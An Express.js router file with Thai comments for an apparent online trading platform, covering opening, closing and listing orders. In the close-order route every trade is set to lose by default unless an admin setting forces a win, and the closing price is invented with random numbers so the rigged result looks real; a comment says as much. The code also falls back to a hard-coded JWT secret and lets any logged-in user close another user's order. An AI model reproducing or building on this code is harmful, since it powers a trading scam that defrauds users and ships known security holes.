const express = require("express");
const router = express.Router();

const User = require("../models/User");
const Order = require("../models/Order");
const TradeSetting = require("../models/TradeSetting");
const Asset = require("../models/Asset");

const jwt = require("jsonwebtoken");
const SECRET = process.env.JWT_SECRET || "SECRET";


// ================= 🔐 AUTH =================
function auth(req, res, next) {
  const token = req.headers.authorization?.split(" ")[1];

  if (!token) return res.status(401).json({ message: "No token" });

  try {
    const decoded = jwt.verify(token, SECRET);
    req.userId = decoded.userId;
    next();
  } catch {
    return res.status(401).json({ message: "Invalid token" });
  }
}


// ================= 🚀 OPEN ORDER =================
router.post("/open", auth, async (req, res) => {
  try {

    const { type, amount, symbol, duration, percent, price } = req.body;

    // 🔒 กันข้อมูลพัง
    if (!type || !amount || !symbol || !duration || !percent || !price) {
      return res.status(400).json({ message: "ข้อมูลไม่ครบ" });
    }

    const user = await User.findById(req.userId);

    if (!user) {
      return res.status(404).json({ message: "ไม่พบผู้ใช้" });
    }

    // 🔥 เช็ค asset เปิด/ปิด
    const asset = await Asset.findOne({ symbol });

    if (asset && asset.enabled === false) {
      return res.status(400).json({ message: "สินทรัพย์นี้ปิดอยู่" });
    }

    // 💰 เช็คเงิน
    if (user.balance < amount) {
      return res.status(400).json({ message: "เงินไม่พอ" });
    }

    // 🔥 หักเงิน
    user.balance -= Number(amount);
    await user.save();

    // 🔥 สร้างออเดอร์
    const order = await Order.create({
      userId: req.userId,
      symbol,
      type: type.toUpperCase(),
      amount: Number(amount),
      percent: Number(percent),
      duration: Number(duration),

      openPrice: Number(price),
      openTime: new Date(),

      status: "open"
    });

    res.json({
      message: "เปิดออเดอร์สำเร็จ",
      balance: user.balance,
      order: {
        ...order.toObject(),
        userId: req.userId,
        timeLeft: duration * 60
      }
    });

  } catch (err) {
    console.log("OPEN ERROR:", err);
    res.status(500).json({ message: "Server error" });
  }
});


// ================= 🔴 CLOSE ORDER =================
router.post("/close/:id", auth, async (req, res) => {
  try {

    const trade = await Order.findById(req.params.id);

    if (!trade) {
      return res.status(404).json({ message: "ไม่พบออเดอร์" });
    }

    if (trade.status === "closed") {
      return res.status(400).json({ message: "ออเดอร์ปิดไปแล้ว" });
    }

    const user = await User.findById(trade.userId);

   
    // 🔥 หา setting ของ user + symbol นี้
const setting = await TradeSetting.findOne({
  userId: trade.userId,
  symbol: trade.symbol
});

let result = "lose";

// 🔥 ถ้า admin ตั้ง asset นี้ = win
if(setting && setting.forceResult === "win"){
  result = "win";
}

    trade.result = result;
    trade.status = "closed";
    trade.closeTime = new Date();

    // 🔥 สร้างราคาปิด (หลอกให้สมจริง)
    if (result === "win") {

      if (trade.type === "BUY") {
        trade.closePrice = trade.openPrice + Math.random();
      } else {
        trade.closePrice = trade.openPrice - Math.random();
      }

    } else {

      if (trade.type === "BUY") {
        trade.closePrice = trade.openPrice - Math.random();
      } else {
        trade.closePrice = trade.openPrice + Math.random();
      }

    }

    // 💰 จ่ายเงิน
    if (result === "win") {

  const profit = trade.amount * (trade.percent / 100);
  user.balance += trade.amount + profit;

} else {

  // ❌ แพ้ → คืน 85%
  const refund = trade.amount * 0.85;
  user.balance += refund;

}

    await trade.save();
    await user.save();

    res.json({
      message: "ปิดออเดอร์แล้ว",
      result,
      balance: user.balance,
      trade
    });

  } catch (err) {
    console.log("CLOSE ERROR:", err);
    res.status(500).json({ message: "Server error" });
  }
});


// ================= 📊 GET OPEN ORDERS =================
router.get("/active", auth, async (req, res) => {
  try {

    const orders = await Order.find({
      userId: req.userId,
      status: "open"
    }).sort({ openTime: -1 });

    res.json(orders);

  } catch (err) {
    res.status(500).json({ message: "Server error" });
  }
});


// ================= 📜 HISTORY =================
router.get("/history", auth, async (req, res) => {
  try {

    const orders = await Order.find({
      userId: req.userId,
      status: "closed"
    }).sort({ closeTime: -1 });

    res.json(orders);

  } catch (err) {
    res.status(500).json({ message: "Server error" });
  }
});

// ================= 🔍 GET SINGLE ORDER =================
router.get("/order/:id", auth, async (req, res) => {
  try {

    const order = await Order.findOne({
      _id: req.params.id,
      userId: req.userId // 🔥 กันดูของคนอื่น
    });

    if (!order) {
      return res.status(404).json({
        message: "ไม่พบออเดอร์"
      });
    }

    res.json(order);

  } catch (err) {
    console.log("GET ORDER ERROR:", err);
    res.status(500).json({
      message: "Server error"
    });
  }
});


module.exports = router;